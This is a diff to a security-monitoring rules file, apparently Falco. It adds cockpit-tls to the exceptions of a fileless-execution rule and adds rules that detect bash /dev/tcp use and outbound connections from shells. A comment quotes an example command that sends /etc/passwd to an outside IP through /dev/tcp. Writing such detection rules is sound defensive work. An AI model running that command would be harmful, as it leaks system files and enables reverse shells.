@@ -51,7 +51,7 @@
     fileless malware execution or code injection to bypass disk scanning.
   condition: >
     evt.type = memfd_create and 
-    not proc.name in (systemd, systemd-executor, systemd-journald)
+    not proc.name in (systemd, systemd-executor, systemd-journald, cockpit-tls)
   output: >
     Fileless execution attempt via memfd_create (process=%proc.name command=%proc.cmdline)
   priority: CRITICAL
@@ -207,3 +207,40 @@
     eBPF management tool executed (user=%user.name command=%proc.cmdline)
   priority: NOTICE
   tags: [mitre_discovery, ebpf]
+
+# ==============================================================================
+# RULE: BASH /DEV/TCP SIGNATURE (Command Line)
+# ==============================================================================
+# Detects the explicit use of the /dev/tcp or /dev/udp syntax in arguments.
+# Example: bash -c 'cat /etc/passwd > /dev/tcp/1.2.3.4/80'
+- rule: Bash /dev/tcp Backdoor (Signature)
+  desc: Detects usage of bash's built-in /dev/tcp or /dev/udp for networking.
+  condition: >
+    spawned_process and 
+    (
+      proc.cmdline contains "/dev/tcp/" or 
+      proc.cmdline contains "/dev/udp/"
+    )
+  output: >
+    Bash /dev/tcp network traffic syntax detected 
+    (cmd=%proc.cmdline user=%user.name container=%container.name)
+  priority: CRITICAL
+  tags: [mitre_command_and_control, reverse_shell]
+
+# ==============================================================================
+# RULE: BASH OUTBOUND CONNECTION (Behavioral)
+# ==============================================================================
+# Detects when bash (or other shells) initiates a network connection.
+# This catches /dev/tcp usage even if the command line is obfuscated or
+# typed interactively, as the underlying syscall is still a 'connect'.
+- rule: Shell Outbound Connection (Potential Backdoor)
+  desc: Detects a shell process initiating an outbound network connection.
+  condition: >
+    outbound and 
+    proc.name in (bash, sh, zsh, ksh, dash, ash) and 
+    not (fd.sip in (127.0.0.1, ::1))
+  output: >
+    Shell initiated outbound network connection (likely /dev/tcp or reverse shell) 
+    (shell=%proc.name target=%fd.sip:%fd.sport cmd=%proc.cmdline)
+  priority: WARNING
+  tags: [mitre_command_and_control, reverse_shell]
